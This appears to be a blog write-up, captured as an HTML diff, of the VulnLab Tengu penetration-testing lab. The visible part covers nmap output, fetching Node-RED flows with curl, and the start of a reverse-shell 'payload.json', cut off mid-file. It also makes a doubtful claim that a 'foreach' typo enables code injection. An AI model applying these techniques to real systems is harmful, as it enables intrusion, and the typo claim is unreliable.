@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Tengu VulnLab Chain - Complete Pentesting Walkthrough &amp; WriteupWelcome to this comprehensive walkthrough and writeup for the Tengu Chain from VulnLab, a challenging ProLab that tests advanced pene">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VL-Tengu">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/11/11/VL-Tengu/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Tengu VulnLab Chain - Complete Pentesting Walkthrough &amp; WriteupWelcome to this comprehensive walkthrough and writeup for the Tengu Chain from VulnLab, a challenging ProLab that tests advanced pene">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tengu/Port1880.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tengu/hash-creds.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tengu/nodered_connector_pass.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tengu/tengu-pass.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tengu/server-admin.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tengu/server-gmsa.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tengu/dumping-gmsa.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tengu/delegation.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tengu/SLQ-ADMINS.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tengu/system.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Tengu/HASH-DPAPI.png">
+<meta property="article:published_time" content="2025-11-11T13:37:52.000Z">
+<meta property="article:modified_time" content="2025-11-11T13:42:49.746Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="Chain">
+<meta property="article:tag" content="Hack The Box">
+<meta property="article:tag" content="ProLab">
+<meta property="article:tag" content="VunlLab">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Tengu/Port1880.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VL-Tengu</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/11/08/VL-Reflection/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/11/VL-Tengu/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&text=VL-Tengu"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&title=VL-Tengu"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&is_video=false&description=VL-Tengu"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Tengu&body=Check out this article: https://panosoikogr.github.io/2025/11/11/VL-Tengu/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&title=VL-Tengu"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&title=VL-Tengu"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&title=VL-Tengu"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&title=VL-Tengu"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&name=VL-Tengu&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/11/VL-Tengu/&t=VL-Tengu"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tengu-VulnLab-Chain-Complete-Pentesting-Walkthrough-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Tengu VulnLab Chain - Complete Pentesting Walkthrough &amp; Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Network-Mapping"><span class="toc-number">1.1.1.</span> <span class="toc-text">Network Mapping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Domain-Controller"><span class="toc-number">1.1.2.</span> <span class="toc-text">Nmap Scan - Domain Controller</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-SQL-Server"><span class="toc-number">1.1.3.</span> <span class="toc-text">Nmap Scan - SQL Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Linux-Host"><span class="toc-number">1.1.4.</span> <span class="toc-text">Nmap Scan - Linux Host</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-Node-RED-Exploitation"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Access - Node-RED Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Service-Discovery"><span class="toc-number">1.2.1.</span> <span class="toc-text">Service Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability-Analysis"><span class="toc-number">1.2.2.</span> <span class="toc-text">Vulnerability Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.2.3.</span> <span class="toc-text">Exploitation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation-Linux-Host"><span class="toc-number">1.3.</span> <span class="toc-text">Post-Exploitation - Linux Host</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Domain-Joined-System-Discovery"><span class="toc-number">1.3.1.</span> <span class="toc-text">Domain-Joined System Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Credential-Discovery"><span class="toc-number">1.3.2.</span> <span class="toc-text">Credential Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Credential-Decryption"><span class="toc-number">1.3.3.</span> <span class="toc-text">Credential Decryption</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pivoting-with-Ligolo-ng"><span class="toc-number">1.4.</span> <span class="toc-text">Pivoting with Ligolo-ng</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Setting-Up-Ligolo-ng"><span class="toc-number">1.4.1.</span> <span class="toc-text">Setting Up Ligolo-ng</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Important-Routing-Consideration"><span class="toc-number">1.4.2.</span> <span class="toc-text">Important Routing Consideration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Configuring-Specific-Routes"><span class="toc-number">1.4.3.</span> <span class="toc-text">Configuring Specific Routes</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Internal-Reconnaissance"><span class="toc-number">1.5.</span> <span class="toc-text">Internal Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Rescan-SQL-Server-via-Ligolo"><span class="toc-number">1.5.1.</span> <span class="toc-text">Nmap Rescan - SQL Server (via Ligolo)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Rescan-Domain-Controller-via-Ligolo"><span class="toc-number">1.5.2.</span> <span class="toc-text">Nmap Rescan - Domain Controller (via Ligolo)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL-Access-and-Database-Enumeration"><span class="toc-number">1.6.</span> <span class="toc-text">MSSQL Access and Database Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Connecting-to-MSSQL"><span class="toc-number">1.6.1.</span> <span class="toc-text">Connecting to MSSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Database-Enumeration"><span class="toc-number">1.6.2.</span> <span class="toc-text">Database Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-User-Credentials"><span class="toc-number">1.6.3.</span> <span class="toc-text">Extracting User Credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Cracking"><span class="toc-number">1.6.4.</span> <span class="toc-text">Password Cracking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Enumeration"><span class="toc-number">1.7.</span> <span class="toc-text">Active Directory Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Collection"><span class="toc-number">1.7.1.</span> <span class="toc-text">BloodHound Collection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Key-Findings-from-BloodHound"><span class="toc-number">1.7.2.</span> <span class="toc-text">Key Findings from BloodHound</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos-Keytab-Extraction"><span class="toc-number">1.8.</span> <span class="toc-text">Kerberos Keytab Extraction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-the-Keytab"><span class="toc-number">1.8.1.</span> <span class="toc-text">Extracting the Keytab</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gMSA-Password-Extraction"><span class="toc-number">1.9.</span> <span class="toc-text">gMSA Password Extraction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dumping-gMSA-Credentials"><span class="toc-number">1.9.1.</span> <span class="toc-text">Dumping gMSA Credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Understanding-the-Attack-Path"><span class="toc-number">1.9.2.</span> <span class="toc-text">Understanding the Attack Path</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Protected-Users-Group-Consideration"><span class="toc-number">1.9.3.</span> <span class="toc-text">Protected Users Group Consideration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos-Delegation-Attack"><span class="toc-number">1.10.</span> <span class="toc-text">Kerberos Delegation Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Obtaining-Service-Ticket"><span class="toc-number">1.10.1.</span> <span class="toc-text">Obtaining Service Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Authenticating-to-MSSQL"><span class="toc-number">1.10.2.</span> <span class="toc-text">Authenticating to MSSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enabling-xp-cmdshell"><span class="toc-number">1.10.3.</span> <span class="toc-text">Enabling xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Checking-Privileges"><span class="toc-number">1.10.4.</span> <span class="toc-text">Checking Privileges</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Establishing-Reverse-Shell-via-MSSQL"><span class="toc-number">1.11.</span> <span class="toc-text">Establishing Reverse Shell via MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Configuring-Ligolo-Listener"><span class="toc-number">1.11.1.</span> <span class="toc-text">Configuring Ligolo Listener</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generating-Payload"><span class="toc-number">1.11.2.</span> <span class="toc-text">Generating Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-to-SYSTEM"><span class="toc-number">1.12.</span> <span class="toc-text">Privilege Escalation to SYSTEM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-SeImpersonatePrivilege"><span class="toc-number">1.12.1.</span> <span class="toc-text">Exploiting SeImpersonatePrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Setting-Up-File-Transfer"><span class="toc-number">1.12.2.</span> <span class="toc-text">Setting Up File Transfer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Transferring-Tools"><span class="toc-number">1.12.3.</span> <span class="toc-text">Transferring Tools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Executing-Privilege-Escalation"><span class="toc-number">1.12.4.</span> <span class="toc-text">Executing Privilege Escalation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation-Discovery"><span class="toc-number">1.13.</span> <span class="toc-text">Post-Exploitation Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Scheduled-Task-Analysis"><span class="toc-number">1.13.1.</span> <span class="toc-text">Scheduled Task Analysis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credential-Harvesting"><span class="toc-number">1.14.</span> <span class="toc-text">Credential Harvesting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Using-LaZagne"><span class="toc-number">1.14.1.</span> <span class="toc-text">Using LaZagne</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DPAPI-Decryption"><span class="toc-number">1.14.2.</span> <span class="toc-text">DPAPI Decryption</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Controller-Compromise"><span class="toc-number">1.15.</span> <span class="toc-text">Domain Controller Compromise</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-Authentication-Attempt"><span class="toc-number">1.15.1.</span> <span class="toc-text">Initial Authentication Attempt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-Authentication"><span class="toc-number">1.15.2.</span> <span class="toc-text">Kerberos Authentication</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VL-Tengu
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-11T13:37:52.000Z" class="dt-published" itemprop="datePublished">2025-11-11</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Chain/" rel="tag">Chain</a>, <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/ProLab/" rel="tag">ProLab</a>, <a class="p-category" href="/tags/VunlLab/" rel="tag">VunlLab</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Tengu-VulnLab-Chain-Complete-Pentesting-Walkthrough-Writeup"><a href="#Tengu-VulnLab-Chain-Complete-Pentesting-Walkthrough-Writeup" class="headerlink" title="Tengu VulnLab Chain - Complete Pentesting Walkthrough &amp; Writeup"></a>Tengu VulnLab Chain - Complete Pentesting Walkthrough &amp; Writeup</h1><p>Welcome to this comprehensive walkthrough and writeup for the <strong>Tengu Chain</strong> from VulnLab, a challenging ProLab that tests advanced penetration testing skills across multiple systems. This guide covers the complete exploitation path from initial reconnaissance to domain compromise, featuring techniques commonly seen in Hack The Box Pro Labs and real-world enterprise environments.</p>
+<p>In this walkthrough, we’ll exploit Node-RED misconfigurations, leverage MSSQL access, perform Kerberos delegation attacks, and escalate privileges through Windows service abuse. This chain demonstrates the complexity of modern Active Directory penetration testing and provides valuable insights for security professionals preparing for advanced certifications.</p>
+<p><strong>Difficulty:</strong> Pro Lab &#x2F; Chain<br><strong>Platform:</strong> VulnLab<br><strong>Skills Required:</strong> Active Directory, Kerberos, MSSQL, Linux pivoting, Windows privilege escalation</p>
+<hr>
+<h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><h3 id="Network-Mapping"><a href="#Network-Mapping" class="headerlink" title="Network Mapping"></a>Network Mapping</h3><p>Starting with the initial network discovery, we identified three hosts:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.10.235.213 DC.tengu.vl</span><br><span class="line">10.10.235.214 SQL.tengu.vl</span><br><span class="line">10.10.235.215</span><br></pre></td></tr></table></figure>
+
+<h3 id="Nmap-Scan-Domain-Controller"><a href="#Nmap-Scan-Domain-Controller" class="headerlink" title="Nmap Scan - Domain Controller"></a>Nmap Scan - Domain Controller</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE    REASON  VERSION</span><br><span class="line">3389/tcp open  RDP/tcpwrapped syn-ack</span><br><span class="line">| ssl-cert: Subject: commonName=DC.tengu.vl</span><br><span class="line">| Issuer: commonName=DC.tengu.vl</span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: -1s</span><br></pre></td></tr></table></figure>
+
+<h3 id="Nmap-Scan-SQL-Server"><a href="#Nmap-Scan-SQL-Server" class="headerlink" title="Nmap Scan - SQL Server"></a>Nmap Scan - SQL Server</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON  VERSION</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services</span><br><span class="line">|_ssl-date: 2025-11-10T18:38:15+00:00; 0s from scanner time.</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: TENGU</span><br><span class="line">|   NetBIOS_Domain_Name: TENGU</span><br><span class="line">|   NetBIOS_Computer_Name: SQL</span><br><span class="line">|   DNS_Domain_Name: tengu.vl</span><br><span class="line">|   DNS_Computer_Name: SQL.tengu.vl</span><br><span class="line">|   DNS_Tree_Name: tengu.vl</span><br></pre></td></tr></table></figure>
+
+<h3 id="Nmap-Scan-Linux-Host"><a href="#Nmap-Scan-Linux-Host" class="headerlink" title="Nmap Scan - Linux Host"></a>Nmap Scan - Linux Host</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON  VERSION</span><br><span class="line">22/tcp   open  ssh           syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu </span><br><span class="line">1880/tcp open  vsat-control? syn-ack</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Initial-Access-Node-RED-Exploitation"><a href="#Initial-Access-Node-RED-Exploitation" class="headerlink" title="Initial Access - Node-RED Exploitation"></a>Initial Access - Node-RED Exploitation</h2><h3 id="Service-Discovery"><a href="#Service-Discovery" class="headerlink" title="Service Discovery"></a>Service Discovery</h3><p>Port 1880 is running <strong>Node-RED</strong>, a flow-based development tool commonly used for IoT applications.</p>
+<p><img src="/images/Tengu/Port1880.png" alt="Node-RED Interface"></p>
+<p>The application connects to the MSSQL server:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;server&quot;:&quot;sql.tengu.vl&quot; &quot;port&quot;:&quot;1433&quot; &quot;database&quot;:&quot;Dev&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h3><p>By retrieving the flows configuration, we discovered valuable information:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.235.215:1880/flows</span><br></pre></td></tr></table></figure>
+
+<p>Within the code, we identified a critical vulnerability - a typo in the JavaScript method:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">results.<span class="title function_">foreach</span>(<span class="function"><span class="params">row</span> =&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p><strong>Note:</strong> This should be <code>forEach</code> (capital C). This typo allows us to inject malicious code that will be executed by the Node-RED runtime.</p>
+<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>We created a malicious payload to establish a reverse shell:</p>
+<p><strong>payload.json</strong> (update IP and port to match your attack infrastructure):</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;39f14ee1019c0406&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tab&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Flow 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;disabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;env&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;d237b4c16a396b9e&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MSSQL-CN&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;tdsVersion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;7_4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SQL&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;server&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sql.tengu.vl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1433&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;encyption&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;trustServerCertificate&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;database&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Dev&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;useUTC&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;connectTimeout&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15000&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;requestTimeout&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15000&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cancelTimeout&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5000&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;pool&quot;</span><span 